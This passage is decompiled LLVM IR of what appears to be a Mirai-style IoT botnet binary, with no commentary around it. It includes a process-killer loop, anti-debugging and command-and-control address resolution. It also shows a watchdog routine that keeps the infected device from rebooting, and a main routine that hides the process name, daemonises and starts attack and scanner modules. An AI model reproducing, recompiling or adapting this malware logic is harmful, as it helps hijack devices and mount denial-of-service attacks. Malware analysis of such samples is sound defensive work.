  store i32 %v2_d180, i32* @r4, align 4
  store i32 %v0_d2ec, i32* @r5, align 4
  br label %dec_label_pc_d0d0.backedge

dec_label_pc_d0d0.backedge:                       ; preds = %dec_label_pc_d134, %dec_label_pc_d12c, %dec_label_pc_d0e0, %dec_label_pc_d2e8, %dec_label_pc_d448, %.thread10
  %stack_var_-8388.1.be = phi i32 [ %v1_d104, %dec_label_pc_d448 ], [ %v1_d104, %dec_label_pc_d2e8 ], [ %v1_d104, %.thread10 ], [ %stack_var_-8388.2, %dec_label_pc_d0e0 ], [ %v1_d104, %dec_label_pc_d12c ], [ %v1_d104, %dec_label_pc_d134 ]
  %v0_d0d0 = load i32, i32* @sb, align 4
  %v1_d0d4 = inttoptr i32 %v0_d0d0 to i32*
  %v2_d0d4 = call i32 @__GI_readdir(i32* %v1_d0d4)
  %v2_d0d8 = icmp eq i32 %v2_d0d4, 0
  br i1 %v2_d0d8, label %dec_label_pc_d170, label %dec_label_pc_d0e0.preheader

dec_label_pc_d2f4:                                ; preds = %dec_label_pc_d2d0
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d2fc = call i32 @__libc_open(i32 %v1_cfb8, i32 0)
  %v7_d300 = icmp eq i32 %v2_d2fc, -1
  store i32 %v2_d2fc, i32* @r4, align 4
  br i1 %v7_d300, label %bb129, label %.thread12

bb129:                                            ; preds = %dec_label_pc_d2f4
  store i32 9, i32* @r1, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d2f4, %bb129
  store i32 ptrtoint (i32* @global_var_d314.79 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d300, i32 ptrtoint (i32* @global_var_10844.78 to i32))
  %v0_d314 = load i32, i32* @r4, align 4
  %v1_d318 = call i32 @__GI___libc_close(i32 %v0_d314)
  br label %dec_label_pc_d31c

dec_label_pc_d31c:                                ; preds = %dec_label_pc_d17c, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d324 = call i32 @__libc_open(i32 %v2_d1a8, i32 0)
  %v7_d328 = icmp eq i32 %v2_d324, -1
  store i32 %v2_d324, i32* @sl, align 4
  br i1 %v7_d328, label %dec_label_pc_d448, label %dec_label_pc_d334

dec_label_pc_d334:                                ; preds = %dec_label_pc_d31c
  %v1_d338 = call i32 @table_unlock_val(i32 18)
  %v1_d340 = call i32 @table_unlock_val(i32 19)
  store i32 %v2_d348, i32* %r1.global-to-local, align 4
  %v3_d350 = call i32 @table_retrieve_val(i32 18, i32* nonnull %stack_var_-44)
  store i32 %v3_d350, i32* @r6, align 4
  store i32 %v2_d35c, i32* %r1.global-to-local, align 4
  %v3_d364 = call i32 @table_retrieve_val(i32 19, i32* nonnull %stack_var_-48)
  store i32 %v3_d364, i32* @r7, align 4
  store i32 %v2_d370, i32* @r4, align 4
  %v0_d37456 = load i32, i32* @sl, align 4
  store i32 %v2_d370, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d38057 = call i32 @__libc_read(i32 %v0_d37456)
  %tmp130 = icmp slt i32 %v1_d38057, 1
  br i1 %tmp130, label %dec_label_pc_d478, label %dec_label_pc_d38c

dec_label_pc_d38c:                                ; preds = %dec_label_pc_d334, %dec_label_pc_d374.backedge
  %v0_d3c047 = phi i32 [ %v1_d380, %dec_label_pc_d374.backedge ], [ %v1_d38057, %dec_label_pc_d334 ]
  store i32 %v2_d38c, i32* @r3, align 4
  %v3_d390 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d390, i32* @r5, align 4
  %v5_d398 = icmp slt i32 %v0_d3c047, %v3_d390
  br i1 %v5_d398, label %dec_label_pc_d3a8, label %dec_label_pc_d3fc.lr.ph

dec_label_pc_d3fc.lr.ph:                          ; preds = %dec_label_pc_d38c
  %v1_d3f439 = add i32 %v0_d3c047, -1
  store i32 %v1_d3f439, i32* %r1.global-to-local, align 4
  %v0_d3fc.pre = load i32, i32* @r6, align 4
  %v1_d400.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d3fc

dec_label_pc_d3a8:                                ; preds = %dec_label_pc_d3f4.backedge, %dec_label_pc_d38c
  store i32 %v2_d38c, i32* %r1.global-to-local, align 4
  %v3_d3ac = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d3ac, i32* @lr, align 4
  %v5_d3b4 = icmp slt i32 %v0_d3c047, %v3_d3ac
  br i1 %v5_d3b4, label %dec_label_pc_d374.backedge, label %.thread25

dec_label_pc_d374.backedge:                       ; preds = %dec_label_pc_d3dc, %.thread25, %dec_label_pc_d3a8
  %v0_d374 = load i32, i32* @sl, align 4
  store i32 %v2_d370, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d380 = call i32 @__libc_read(i32 %v0_d374)
  %tmp131 = icmp slt i32 %v1_d380, 1
  br i1 %tmp131, label %dec_label_pc_d478, label %dec_label_pc_d38c

.thread25:                                        ; preds = %dec_label_pc_d3a8
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d3c049 = icmp eq i32 %v0_d3c047, 0
  br i1 %v2_d3c049, label %dec_label_pc_d374.backedge, label %dec_label_pc_d3c8.lr.ph

dec_label_pc_d3c8.lr.ph:                          ; preds = %.thread25
  %v0_d3c8.pre = load i32, i32* @r7, align 4
  %v1_d3cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d3c8

dec_label_pc_d3c8:                                ; preds = %dec_label_pc_d3dc, %dec_label_pc_d3c8.lr.ph
  %v0_d3c0.in = phi i32 [ %v0_d3c047, %dec_label_pc_d3c8.lr.ph ], [ %v0_d3c0, %dec_label_pc_d3dc ]
  %v0_d3dc = phi i32 [ 0, %dec_label_pc_d3c8.lr.ph ], [ %v1_d3dc, %dec_label_pc_d3dc ]
  %v1_d3c8 = phi i32 [ 0, %dec_label_pc_d3c8.lr.ph ], [ %v1_d3c886, %dec_label_pc_d3dc ]
  %v0_d3c0 = add i32 %v0_d3c0.in, -1
  %v2_d3c8 = add i32 %v1_d3c8, %v0_d3c8.pre
  %v3_d3c8 = inttoptr i32 %v2_d3c8 to i8*
  %v4_d3c8 = load i8, i8* %v3_d3c8, align 1
  %v6_d3c8 = zext i8 %v4_d3c8 to i32
  store i32 %v6_d3c8, i32* %r2.global-to-local, align 4
  %v2_d3cc = add i32 %v0_d3dc, %v1_d3cc.pre
  %v3_d3cc = inttoptr i32 %v2_d3cc to i8*
  %v4_d3cc = load i8, i8* %v3_d3cc, align 1
  %v6_d3cc = zext i8 %v4_d3cc to i32
  store i32 %v6_d3cc, i32* @r3, align 4
  %v9_d3d0 = icmp eq i8 %v4_d3cc, %v4_d3c8
  br i1 %v9_d3d0, label %dec_label_pc_d418, label %bb132

bb132:                                            ; preds = %dec_label_pc_d3c8
  br label %dec_label_pc_d3dc

dec_label_pc_d3dc:                                ; preds = %bb132, %dec_label_pc_d418
  %v1_d3c886 = phi i32 [ %v1_d418, %dec_label_pc_d418 ], [ 0, %bb132 ]
  %v1_d3dc = add i32 %v0_d3dc, 1
  store i32 %v1_d3dc, i32* %r1.global-to-local, align 4
  %v2_d3c0 = icmp eq i32 %v0_d3c0, 0
  br i1 %v2_d3c0, label %dec_label_pc_d374.backedge, label %dec_label_pc_d3c8

dec_label_pc_d3e4:                                ; preds = %dec_label_pc_d3fc
  %v1_d3e4 = add i32 %v1_d3fc, 1
  store i32 %v1_d3e4, i32* @lr, align 4
  %v9_d3e8 = icmp eq i32 %v3_d390, %v1_d3e4
  br i1 %v9_d3e8, label %dec_label_pc_d424, label %dec_label_pc_d3f4.backedge

dec_label_pc_d3f4.backedge:                       ; preds = %dec_label_pc_d3e4, %dec_label_pc_d410
  %v1_d3fc77 = phi i32 [ 0, %dec_label_pc_d410 ], [ %v1_d3e4, %dec_label_pc_d3e4 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d3f4 = add i32 %v0_d3f4, -1
  store i32 %v1_d3f4, i32* %r1.global-to-local, align 4
  %v2_d3f4 = icmp eq i32 %v0_d3f4, 0
  br i1 %v2_d3f4, label %dec_label_pc_d3a8, label %dec_label_pc_d3fc

dec_label_pc_d3fc:                                ; preds = %dec_label_pc_d3f4.backedge, %dec_label_pc_d3fc.lr.ph
  %v0_d3f4 = phi i32 [ %v1_d3f439, %dec_label_pc_d3fc.lr.ph ], [ %v1_d3f4, %dec_label_pc_d3f4.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d3fc.lr.ph ], [ %storemerge, %dec_label_pc_d3f4.backedge ]
  %v1_d3fc = phi i32 [ 0, %dec_label_pc_d3fc.lr.ph ], [ %v1_d3fc77, %dec_label_pc_d3f4.backedge ]
  %v2_d3fc = add i32 %v1_d3fc, %v0_d3fc.pre
  %v3_d3fc = inttoptr i32 %v2_d3fc to i8*
  %v4_d3fc = load i8, i8* %v3_d3fc, align 1
  %v6_d3fc = zext i8 %v4_d3fc to i32
  store i32 %v6_d3fc, i32* %r2.global-to-local, align 4
  %v2_d400 = add i32 %storemerge.in, %v1_d400.pre
  %v3_d400 = inttoptr i32 %v2_d400 to i8*
  %v4_d400 = load i8, i8* %v3_d400, align 1
  %v6_d400 = zext i8 %v4_d400 to i32
  store i32 %v6_d400, i32* @r3, align 4
  %v9_d404 = icmp eq i8 %v4_d400, %v4_d3fc
  br i1 %v9_d404, label %dec_label_pc_d3e4, label %dec_label_pc_d410

dec_label_pc_d410:                                ; preds = %dec_label_pc_d3fc
  br label %dec_label_pc_d3f4.backedge

dec_label_pc_d418:                                ; preds = %dec_label_pc_d3c8
  %v1_d418 = add i32 %v1_d3c8, 1
  %v9_d41c = icmp eq i32 %v3_d3ac, %v1_d418
  br i1 %v9_d41c, label %dec_label_pc_d424, label %dec_label_pc_d3dc

dec_label_pc_d424:                                ; preds = %dec_label_pc_d3e4, %dec_label_pc_d418
  %v1_d428 = call i32 @table_lock_val(i32 18)
  %v1_d430 = call i32 @table_lock_val(i32 19)
  %v0_d434 = load i32, i32* @sl, align 4
  %v1_d438 = call i32 @__GI___libc_close(i32 %v0_d434)
  %v0_d43c = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d444 = call i32 @kill(i32 %v0_d43c, i32 9)
  br label %dec_label_pc_d448

dec_label_pc_d448:                                ; preds = %dec_label_pc_d31c, %dec_label_pc_d478, %dec_label_pc_d424
  store i32 %v2_d1a8, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d450 = call i32 @util_zero()
  store i32 %v2_d1f8, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d460 = call i32 @util_zero()
  %v1_d468 = call i32 @sleep(i32 1)
  store i32 %v2_d180, i32* @r4, align 4
  %v0_d470 = load i32, i32* @r8, align 4
  store i32 %v0_d470, i32* @r5, align 4
  br label %dec_label_pc_d0d0.backedge

dec_label_pc_d478:                                ; preds = %dec_label_pc_d374.backedge, %dec_label_pc_d334
  %v1_d47c = call i32 @table_lock_val(i32 18)
  %v1_d484 = call i32 @table_lock_val(i32 19)
  %v0_d488 = load i32, i32* @sl, align 4
  %v1_d48c = call i32 @__GI___libc_close(i32 %v0_d488)
  br label %dec_label_pc_d448

; uselistorder directives
  uselistorder i32 %v1_d418, { 1, 0 }
  uselistorder i32 %v1_d3dc, { 1, 0 }
  uselistorder i32 %v1_d3c8, { 1, 0 }
  uselistorder i32 %v0_d3dc, { 1, 0 }
  uselistorder i32 %v1_d380, { 1, 0 }
  uselistorder i32 %v2_d324, { 1, 0 }
  uselistorder i1 %v7_d300, { 1, 0 }
  uselistorder i32 %v2_d2fc, { 1, 0 }
  uselistorder i32 %v2_d0d4, { 1, 0 }
  uselistorder i32 %stack_var_-8388.1.be, { 1, 0 }
  uselistorder i32 %v3_d254, { 1, 2, 0 }
  uselistorder i32 %v2_d164, { 1, 0 }
  uselistorder i32 %v1_d104, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_d0e0, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-8388.0, { 1, 0 }
  uselistorder i32 %v2_d370, { 1, 0, 2 }
  uselistorder i32 %v2_d1f8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_d050, { 1, 0 }
  uselistorder i32 %v2_d01c, { 2, 0, 1 }
  uselistorder i32 %v3_cfc8, { 1, 0 }
  uselistorder i32 %v1_cfb8, { 3, 2, 0, 4, 6, 5, 8, 7, 9, 10, 1, 11, 12, 13, 14 }
  uselistorder i32 %storemerge96, { 1, 0 }
  uselistorder i32 %v0_cf28, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 2, 1, 36, 3, 37, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35 }
  uselistorder i32 (i32, i32)* @kill, { 3, 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @killer_kill_by_port, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_241f4.75, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_d448, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d424, { 1, 0 }
  uselistorder label %dec_label_pc_d3f4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d3dc, { 1, 0 }
  uselistorder label %dec_label_pc_d38c, { 1, 0 }
  uselistorder label %dec_label_pc_d31c, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d0d0.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d2b0, { 1, 0 }
  uselistorder label %dec_label_pc_d0e0, { 1, 0 }
  uselistorder label %dec_label_pc_d0e0.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_d4bc.81 to i32), i32* @global_var_21568.83, align 4
  ret i32 %arg1
}

define i32 @resolve_cnc_addr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_d4c4 = call i32 @table_unlock_val(i32 1)
  store i32 ptrtoint ([13 x i8]* @global_var_18d6c.85 to i32), i32* @r0, align 4
  %v2_d4cc = call i32 @inet_addr(i32 ptrtoint ([13 x i8]* @global_var_18d6c.85 to i32))
  store i32 ptrtoint (i16** @global_var_241fc.87 to i32), i32* @r4, align 4
  store i32 %v2_d4cc, i32* @global_var_24200.88, align 4
  %v3_d4e0 = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_d4e0 = inttoptr i32 %v3_d4e0 to i16*
  %v3_d4e4 = load i16, i16* %v4_d4e0, align 2
  store i16 %v3_d4e4, i16* bitcast (i32* @global_var_241fe.89 to i16*), align 4
  %v1_d4f0 = call i32 @table_lock_val(i32 1)
  ret i32 %v1_d4f0
}

define i32 @watchdog_maintain(i64* %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_d504 = load i32, i32* @r4, align 4
  %v6_d504 = load i32, i32* @r5, align 4
  %v9_d504 = load i32, i32* @lr, align 4
  %v0_d50c = call i32 @__libc_fork()
  %v7_d510 = icmp eq i32 %v0_d50c, -1
  %. = zext i1 %v7_d510 to i32
  %tmp12 = icmp slt i32 %v0_d50c, 1
  %storemerge4 = select i1 %tmp12, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_d52c = icmp eq i32 %storemerge4, 0
  store i32 %v0_d50c, i32* @global_var_216dc.91, align 4
  br i1 %v2_d52c, label %dec_label_pc_d544, label %dec_label_pc_d538

dec_label_pc_d538:                                ; preds = %entry
  store i32 %v3_d504, i32* @r4, align 4
  store i32 %v6_d504, i32* @r5, align 4
  store i32 %v9_d504, i32* @lr, align 4
  ret i32 %v0_d50c

dec_label_pc_d544:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_d550 = call i32 @table_unlock_val(i32 23)
  %v1_d558 = call i32 @table_unlock_val(i32 24)
  %v0_d55c = load i32, i32* @r5, align 4
  %v2_d564 = inttoptr i32 %v0_d55c to i32*
  %v3_d564 = call i32 @table_retrieve_val(i32 23, i32* %v2_d564)
  %v2_d56c = call i32 @__libc_open(i32 %v3_d564, i32 2)
  %v7_d570 = icmp eq i32 %v2_d56c, -1
  store i32 %v2_d56c, i32* @r4, align 4
  br i1 %v7_d570, label %dec_label_pc_d5b8, label %dec_label_pc_d57c

dec_label_pc_d57c:                                ; preds = %dec_label_pc_d5b8, %dec_label_pc_d544
  %v0_d588 = phi i32 [ %v2_d5c8, %dec_label_pc_d5b8 ], [ %v2_d56c, %dec_label_pc_d544 ]
  %v2_d58c = ptrtoint i32* %stack_var_-20 to i32
  %v3_d590 = call i32 @ioctl(i32 %v0_d588, i32 -2147199228, i32 %v2_d58c)
  br label %dec_label_pc_d594

dec_label_pc_d594:                                ; preds = %dec_label_pc_d594, %dec_label_pc_d57c
  %v0_d5a0 = load i32, i32* @r4, align 4
  %v3_d5a8 = call i32 @ioctl(i32 %v0_d5a0, i32 -2147199227, i32 0)
  %v1_d5b0 = call i32 @sleep(i32 10)
  br label %dec_label_pc_d594

dec_label_pc_d5b8:                                ; preds = %dec_label_pc_d544
  %v0_d5b8 = load i32, i32* @r5, align 4
  %v2_d5c0 = inttoptr i32 %v0_d5b8 to i32*
  %v3_d5c0 = call i32 @table_retrieve_val(i32 24, i32* %v2_d5c0)
  %v2_d5c8 = call i32 @__libc_open(i32 %v3_d5c0, i32 2)
  %v3_d5cc = icmp eq i32 %v2_d5c8, -1
  store i32 %v2_d5c8, i32* @r4, align 4
  br i1 %v3_d5cc, label %dec_label_pc_d5d8, label %dec_label_pc_d57c

dec_label_pc_d5d8:                                ; preds = %dec_label_pc_d5b8
  %v1_d5dc = call i32 @table_lock_val(i32 23)
  %v1_d5e4 = call i32 @table_lock_val(i32 24)
  %v0_d5e8 = load i32, i32* @r5, align 4
  %v1_d5ec = call i32 @__GI_exit(i32 %v0_d5e8)
  %v0_d5f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d5f0, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_d5d8
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_d5d8, %bb15
  ret i32 %v1_d5ec

; uselistorder directives
  uselistorder i32 %v2_d5c8, { 1, 2, 0 }
  uselistorder i32 %v2_d56c, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_d50c, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1416 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-392 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_d600 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d600, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_d618 = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  %v2_d624 = call i32 @__GI_sigaddset(i32 %v2_d600, i32 2)
  %v0_d628 = load i32, i32* @r5, align 4
  store i32 %v0_d628, i32* %r2.global-to-local, align 4
  %v4_d634 = call i32 @__GI_sigprocmask(i32 %v0_d628, i32* nonnull %stack_var_-64, i32 %v0_d628)
  %v2_d640 = call i32 @bsd_signal(i32 17, i32 1)
  %v2_d64c = call i32 @bsd_signal(i32 5, i32 54436)
  %v0_d650 = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_241fc.87 to i32), i32* %r2.global-to-local, align 4
  store i32 1494907824, i32* @global_var_24200.88, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 5888, i32* %r3.global-to-local, align 4
  store i32 %v0_d650, i32* @global_var_241f0.57, align 4
  store i16 5888, i16* bitcast (i32* @global_var_241fe.89 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_241fc.87 to i16*), align 4
  %v6_d678 = call i32 @table_init(i32 %v0_d650, i32 ptrtoint (i32* @global_var_241f0.57 to i32), i32 ptrtoint (i16** @global_var_241fc.87 to i32), i32 5888)
  store i32 ptrtoint (i32* @global_var_d4bc.81 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21568.83 to i32), i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_d4bc.81 to i32), i32* @global_var_21568.83, align 4
  %v1_d688 = call i32 @rand_init(i32 %v6_d678)
  %v2_d690 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_d690, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_d698 = call i32 @util_zero()
  %v0_d69c = load i32, i32* @r6, align 4
  %v7_d69c = icmp eq i32 %v0_d69c, 2
  br i1 %v7_d69c, label %dec_label_pc_d7d4, label %dec_label_pc_d6a4

dec_label_pc_d6a4:                                ; preds = %dec_label_pc_d7d4, %entry, %dec_label_pc_d7e4
  %v0_d6a4 = call i32 @rand_next()
  store i32 %v0_d6a4, i32* @r6, align 4
  %v0_d6ac = load i32, i32* @r8, align 4
  %v1_d6ac = inttoptr i32 %v0_d6ac to i32*
  %v2_d6ac = load i32, i32* %v1_d6ac, align 4
  %v1_d6b0 = inttoptr i32 %v2_d6ac to i8*
  %v2_d6b0 = call i32 @util_strlen(i8* %v1_d6b0)
  %v0_d6b8 = load i32, i32* @r8, align 4
  %v1_d6b8 = inttoptr i32 %v0_d6b8 to i32*
  %v2_d6b8 = load i32, i32* %v1_d6b8, align 4
  %v1_d6bc = inttoptr i32 %v2_d6b8 to i8*
  %v2_d6bc = call i32 @util_strlen(i8* %v1_d6bc)
  %v1_d6c0 = sub i32 20, %v2_d6b0
  %v0_d6c8 = load i32, i32* @r6, align 4
  %v3_d6cc = urem i32 %v0_d6c8, %v1_d6c0
  %v2_d6d4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_d6d4, i32* @r5, align 4
  %v2_d6d8 = add i32 %v3_d6cc, %v2_d6bc
  store i32 %v2_d6d8, i32* @r4, align 4
  %v2_d6e4 = call i32 @rand_alpha_str(i32 %v2_d6d4, i32 %v2_d6d8)
  %v2_d6ec = ptrtoint i32* %stack_var_-40 to i32
  %v1_d6f0 = load i32, i32* @r4, align 4
  %v2_d6f0 = add i32 %v1_d6f0, %v2_d6ec
  store i32 %v2_d6f0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  %v0_d6fc = load i32, i32* @r8, align 4
  %v1_d6fc = inttoptr i32 %v0_d6fc to i32*
  %v2_d6fc = load i32, i32* %v1_d6fc, align 4
  store i32 %v2_d6fc, i32* @r0, align 4
  %v3_d700 = add i32 %v2_d6f0, -64
  %v4_d700 = inttoptr i32 %v3_d700 to i8*
  store i8 0, i8* %v4_d700, align 1
  %v2_d704 = inttoptr i32 %v2_d6fc to i8*
  %v3_d704 = call i32 @util_strcpy(i8* %v2_d704, i32 %v2_d6d4)
  store i32 32, i32* @r1, align 4
  store i32 %v2_d6d4, i32* @r0, align 4
  %v0_d710 = call i32 @util_zero()
  %v0_d714 = call i32 @rand_next()
  store i32 %v0_d714, i32* @r7, align 4
  %v0_d71c = load i32, i32* @r8, align 4
  %v1_d71c = inttoptr i32 %v0_d71c to i32*
  %v2_d71c = load i32, i32* %v1_d71c, align 4
  %v1_d720 = inttoptr i32 %v2_d71c to i8*
  %v2_d720 = call i32 @util_strlen(i8* %v1_d720)
  store i32 %v2_d720, i32* @r6, align 4
  %v0_d728 = load i32, i32* @r8, align 4
  %v1_d728 = inttoptr i32 %v0_d728 to i32*
  %v2_d728 = load i32, i32* %v1_d728, align 4
  %v1_d72c = inttoptr i32 %v2_d728 to i8*
  %v2_d72c = call i32 @util_strlen(i8* %v1_d72c)
  %v0_d730 = load i32, i32* @r6, align 4
  %v1_d730 = sub i32 20, %v0_d730
  %v0_d738 = load i32, i32* @r7, align 4
  %v3_d73c = urem i32 %v0_d738, %v1_d730
  %v2_d740 = add i32 %v3_d73c, %v2_d72c
  store i32 %v2_d740, i32* @r4, align 4
  %v2_d74c = call i32 @rand_alpha_str(i32 %v2_d6d4, i32 %v2_d740)
  store i32 %v2_d6ec, i32* %r2.global-to-local, align 4
  %v1_d758 = load i32, i32* @r4, align 4
  %v2_d758 = add i32 %v1_d758, %v2_d6ec
  store i32 %v2_d758, i32* %r3.global-to-local, align 4
  %v0_d75c = load i32, i32* @sb, align 4
  %v1_d75c = trunc i32 %v0_d75c to i8
  %v3_d75c = add i32 %v2_d758, -64
  %v4_d75c = inttoptr i32 %v3_d75c to i8*
  store i8 %v1_d75c, i8* %v4_d75c, align 1
  %v4_d768 = call i32 @prctl(i32 15, i32 %v2_d6d4, i32 %v2_d6ec, i32 %v2_d758)
  %v1_d770 = call i32 @table_unlock_val(i32 3)
  %v3_d77c = call i32 @table_retrieve_val(i32 3, i32* nonnull %stack_var_-48)
  %v3_d780 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d780, i32* @r2, align 4
  %v2_d78c = call i32 @__GI___libc_write(i32 1, i32 %v3_d77c)
  store i32 1, i32* @r2, align 4
  %v2_d79c = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_18d7c.99 to i32))
  %v1_d7a4 = call i32 @table_lock_val(i32 3)
  %v1_d7a8 = call i32 @attack_init(i32 %v1_d7a4)
  %v1_d7ac = call i32 @killer_init(i32 %v1_d7a8)
  %v1_d7b0 = inttoptr i32 %v1_d7ac to i64*
  %v2_d7b0 = call i32 @watchdog_maintain(i64* %v1_d7b0)
  %v0_d7b4 = call i32 @__libc_fork()
  %v1_d7b8 = load i32, i32* @sb, align 4
  %v7_d7bc = icmp sgt i32 %v0_d7b4, %v1_d7b8
  br i1 %v7_d7bc, label %dec_label_pc_d7c0, label %dec_label_pc_d810

dec_label_pc_d7c0:                                ; preds = %dec_label_pc_d6a4
  ret i32 %v1_d7b8

dec_label_pc_d7d4:                                ; preds = %entry
  %v0_d7d4 = load i32, i32* @r8, align 4
  %v1_d7d4 = add i32 %v0_d7d4, 4
  %v2_d7d4 = inttoptr i32 %v1_d7d4 to i32*
  %v3_d7d4 = load i32, i32* %v2_d7d4, align 4
  %v1_d7d8 = inttoptr i32 %v3_d7d4 to i8*
  %v2_d7d8 = call i32 @util_strlen(i8* %v1_d7d8)
  %v8_d7e0 = icmp sgt i32 %v2_d7d8, 31
  br i1 %v8_d7e0, label %dec_label_pc_d6a4, label %dec_label_pc_d7e4

dec_label_pc_d7e4:                                ; preds = %dec_label_pc_d7d4
  %v0_d7e8 = load i32, i32* @r8, align 4
  %v1_d7e8 = add i32 %v0_d7e8, 4
  %v2_d7e8 = inttoptr i32 %v1_d7e8 to i32*
  %v3_d7e8 = load i32, i32* %v2_d7e8, align 4
  store i32 %v2_d690, i32* @r0, align 4
  %v2_d7f0 = bitcast i32* %stack_var_-136 to i8*
  %v3_d7f0 = call i32 @util_strcpy(i8* %v2_d7f0, i32 %v3_d7e8)
  %v0_d7f4 = load i32, i32* @r8, align 4
  %v1_d7f4 = add i32 %v0_d7f4, 4
  %v2_d7f4 = inttoptr i32 %v1_d7f4 to i32*
  %v3_d7f4 = load i32, i32* %v2_d7f4, align 4
  %v1_d7fc = inttoptr i32 %v3_d7f4 to i8*
  %v2_d7fc = call i32 @util_strlen(i8* %v1_d7fc)
  store i32 %v2_d7fc, i32* @r1, align 4
  store i32 %v3_d7f4, i32* @r0, align 4
  %v0_d808 = call i32 @util_zero()
  br label %dec_label_pc_d6a4

dec_label_pc_d810:                                ; preds = %dec_label_pc_d6a4
  %v1_d810 = call i32 @__GI_setsid(i32 %v0_d7b4)
  %v0_d814 = load i32, i32* @sb, align 4
  %v1_d818 = call i32 @__GI___libc_close(i32 %v0_d814)
  %v1_d820 = call i32 @__GI___libc_close(i32 1)
  %v1_d828 = call i32 @__GI___libc_close(i32 2)
  %v1_d82c = call i32 @attack_init(i32 %v1_d828)
  %v1_d830 = call i32 @killer_init(i32 %v1_d82c)
  %v1_d834 = inttoptr i32 %v1_d830 to i64*
  %v2_d834 = call i32 @watchdog_maintain(i64* %v1_d834)
  %v1_d838 = call i32 @scanner_init(i32 %v2_d834)
  store i32 ptrtoint (i32* @global_var_21564.101 to i32), i32* @sl, align 4
  store i32 ptrtoint (i8** @global_var_216e0.103 to i32), i32* @fp, align 4
  %v2_d84c = ptrtoint i32* %stack_var_-264 to i32
  store i32 %v2_d84c, i32* @r6, align 4
  %v2_d850 = ptrtoint i32* %stack_var_-392 to i32
  store i32 %v2_d850, i32* @r7, align 4
